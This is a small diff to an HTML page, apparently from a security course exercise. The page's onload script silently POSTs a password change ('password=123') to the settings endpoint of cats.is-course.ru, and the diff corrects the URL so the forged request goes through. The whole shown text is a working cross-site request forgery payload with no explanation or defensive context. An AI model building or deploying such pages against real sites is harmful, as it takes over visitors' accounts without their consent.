@@ -7,7 +7,7 @@
     <script>
         window.onload = function() {
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://cats.is-course.ru/settings?", true);
+            xhr.open("POST", "https://cats.is-course.ru/settings", true);
             xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
             xhr.send('password=123&confirm-password=123');
         }
